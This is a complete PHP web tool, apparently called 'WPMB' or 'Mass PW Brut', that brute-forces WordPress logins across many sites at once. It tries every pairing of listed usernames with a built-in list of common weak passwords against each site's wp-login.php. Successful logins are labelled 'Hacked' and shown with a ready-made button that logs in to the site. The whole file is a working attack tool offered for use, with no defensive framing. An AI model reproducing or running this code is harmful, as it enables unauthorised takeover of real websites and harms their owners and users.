<?php 
// Coded By 8105 
// google.com/+BiosMA 
// youtube.com/channel/UCfR2IybMVNG5Q8Qp3GMCvRA 
// fb.com/B10S-1309549119165925 
error_reporting(0); 
set_time_limit(0); 
ignore_user_abort(true); 
?><!DOCTYPE html><!--[if IE 8]><html xmlns="http://www.w3.org/1999/xhtml" class="ie8" lang="en"><![endif]--><!--[if !(IE 8) ]><!--> 
<!-- By B10S (8105) --> 
<!-- google.com/+BiosMA --> 
<!-- youtube.com/channel/UCfR2IybMVNG5Q8Qp3GMCvRA  --> 
<!-- fb.com/B10S-1309549119165925  --> 
<html xmlns="http://www.w3.org/1999/xhtml" lang="en"><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /> 
<title>WPMB By (B10S)</title> 
<link rel="fluid-icon" href="https://lh5.googleusercontent.com/OcCKV6hPCJ5mZRi10xYenLK--OptsMhPWCIOG62DtWGpjthGSJpSJYJTWXqviR9gJsVWZ6CruBScrZc=w1280-h918"> 
<style type="text/css">textarea{padding:7px 14px;height:312px;color:#2e4453;font-size:16px;font-weight:normal;line-height:1.5;border:1px solid#c8d7e1; 
background-color:white;box-shadow:none;transition:all.15s ease-in-out;} 
#brd{border:1px solid black;border-collapse:collapse;padding:5px} 
body{min-width:0;color:#444;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Oxygen-Sans,Ubuntu,Cantarell,"Helvetica Neue",sans-serif; 
font-size:13px;} 
.form{background:#ffffff;border:1px solid#d4dfe7;box-shadow:0px 1px 2px 0px#e7edf3;padding:20px 24px 24px;margin-left:auto;margin-right:auto;} 
#FIN{font-size:14px;font-weight:600;margin-bottom:5px;color:#2e4453;line-height:24px;} 
button{background:#00aadc;border-color:#0087be;color:white;border-style:solid;border-width:1px 1px 2px} 
input{width:45%;background:#00aadc;border-color:#0087be;color:white;border-style:solid;border-width:1px 1px 2px;cursor:pointer; 
font-size:14px;line-height:1.3;border-radius:4px;padding:10px 16px;}</style></head><body bgcolor="#e9eff3"><center> 
<div id="login" style="width:65%;height:50%"> 
<h1><a href="https://goo.gl/A16JAU" title="Tool In GitHub" tabindex="-1">~:: Mass PW Brut ::~</a></h1> 
<img src="https://lh5.googleusercontent.com/OcCKV6hPCJ5mZRi10xYenLK--OptsMhPWCIOG62DtWGpjthGSJpSJYJTWXqviR9gJsVWZ6CruBScrZc=w1280-h918" width="200" title="WPMB By (8105) !  ;-}" /> 
<form class="form" method="post"><table cellspacing="0" cellpadding="0"><center> 
<tr><td><div id="FIN">List Site :</div></td><td><div id="FIN">User Names </div></td><td><div id="FIN">Pass Words</div></td></tr>
<tr><td><textarea name=s>http://example.com/blog</textarea></td><td><textarea name=u>admin</textarea></td> 
<td><textarea name=p><?="admin\n123456\n123123\nadmin123\npassword1\nabc123\n12341234\nquerty\npass\nadministrator"?></textarea></td> 
</tr></center></table><p><input type="submit" name="sub" value="<=  Brut Now  =>" /></p></form></div><?php 
if($_POST){ 
echo"<table id='brd'><tr id='brd'><td id='brd'>Addr</td>
<td id='brd'>User</td><td id='brd'>Pass</td><td id='brd'>Req Type</td><td id='brd'>Action</td></tr>"; 
$s=explode("\n",str_replace("\r",'',$_POST['s'])); 
$u=explode("\n",str_replace("\r",'',$_POST['u'])); 
$p=explode("\n",str_replace("\r",'',$_POST['p'])); 
foreach($u as$U=>$_U){ 
   foreach($p as$P=>$_P){ 
     foreach($s as$S=>$_S){ 
      if($_S=='NULL')continue; 
      $_S=(substr($_S,-1)!='/')?$_S.'/':$_S; 
      $_S=substr($_S,0,7)=='http://'?$_S:(substr($_S,0,8)=='https://')?$_S:'http://'.$_S; 
      if(!th($_S)){ 
        echo"<tr id='brd' style='color:#F00'><td>".$_S."</td>
<td id='brd'>N/A</td><td id='brd'>N/A</td><td id='brd'>Error URL !</td><td id='brd'>N/A</td></tr>"; 
        ob_flush();flush(); 
        $s[$S]='NULL'; 
        continue;} 
      $bt=curl_init(); 
      curl_setopt($bt,CURLOPT_RETURNTRANSFER,1); 
      curl_setopt($bt,CURLOPT_URL,$_S.'wp-login.php'); 
      curl_setopt($bt,CURLOPT_COOKIEJAR,"coki.txt"); 
      curl_setopt($bt,CURLOPT_COOKIEFILE,"coki.txt"); 
      curl_setopt($bt,CURLOPT_FOLLOWLOCATION,1); 
      curl_setopt($bt,CURLOPT_POST,TRUE); 
      curl_setopt($bt,CURLOPT_POSTFIELDS,"log=".$_U."&pwd=".$_P."&testcookie=1"); 
      $rez=curl_exec($bt); 
      $N=curl_getinfo($bt,CURLINFO_HTTP_CODE); 
      curl_close($bt); 
      if($N==404){ 
        echo"<tr id='brd' style='color:#F00'><td id='brd'>".$_S."wp-login.php</td> 
<td id='brd'>N/A</td><td id='brd'>N/A</td><td id='brd'>Login No Found !</td><td>404</td></tr>"; 
        ob_flush();flush(); 
        $s[$S]='NULL'; 
        continue;} 
      if(eregi("profile.php",$rez)){ 
echo'<iframe src="'.$_S.'wp-admin/" style="width:0;height:0;border:0;border:none;"></iframe>'; 
ob_flush();flush(); 
echo"<tr id='brd' style='color:#0F0'><td>".$_S."</td><td id='brd'>".$_U."</td><td id='brd'>".$_P."</td><td id='brd'>Hacked</td> 
<td id='brd'><form target=_blank action='".$_S."wp-login.php' method=POST><input type=hidden name=log value=".$_U." /> 
<input type=hidden name=pwd value=".$_P." /> 
<input type=hidden name=testcookie value=1 /><button>Connect</button></form>"; 
        ob_flush();flush();}}}} 
echo"</table>";} 
function th($ts){ 
  $R=curl_init(); 
    curl_setopt($R,CURLOPT_URL,$ts); 
    curl_setopt($R,CURLOPT_BINARYTRANSFER,1); 
    curl_setopt($R,CURLOPT_HEADERFUNCTION,'curlHeaderCallback'); 
    curl_setopt($R,CURLOPT_FAILONERROR,1); 
    curl_exec($R); 
    $RN=curl_getinfo($R,CURLINFO_HTTP_CODE); 
    curl_close($R); 
  return $RN==200?true:false;} 
?></center></body></html> 
